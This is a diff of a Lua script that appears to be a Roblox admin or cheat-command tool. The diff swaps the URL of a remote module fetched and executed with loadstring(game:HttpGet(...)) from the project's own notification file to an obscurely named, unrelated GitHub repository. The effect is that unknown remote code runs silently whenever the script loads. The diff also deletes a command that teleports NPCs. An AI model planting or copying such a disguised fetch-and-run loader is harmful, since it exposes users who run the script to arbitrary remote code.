@@ -74,7 +74,7 @@ local Notification=nil
 
 repeat 
 	local s,r=pcall(function()
-		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NamelessAdminNotifications.lua"))()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/d1amondz96/Gomzkmxk/refs/heads/main/VmdkamzH",true))()
 	end);
 
 	if s then
@@ -4735,26 +4735,6 @@ cmd.add({"bringnpcs"},{"bringnpcs","Brings NPCs"},function()
 	for _,hum in pairs(game:GetService("Workspace"):GetDescendants()) do
 		disappear(hum)
 	end
-end)
-
-cmd.add({"loopbringnpcs"},{"loopbringnpcs","LoopBrings NPCs"},function()
-while true do
-    wait()
-	local npcs={}
-
-	function disappear(hum)
-		if hum:IsA("Humanoid") and not game:GetService("Players"):GetPlayerFromCharacter(hum.Parent) then
-			table.insert(npcs,{hum,hum.HipHeight})
-			local rootPart=hum.Parent:FindFirstChild("HumanoidRootPart")
-			if rootPart then
-				rootPart.CFrame=getRoot(getChar()).CFrame
-			end      
-		end
-	end
-	for _,hum in pairs(game:GetService("Workspace"):GetDescendants()) do
-		disappear(hum)
-	    end
-    end
 end)
 
 cmd.add({"controlnpcs","cnpcs"},{"controlnpcs (cnpcs)","Keybind: CTRL+LEFTCLICK"},function()
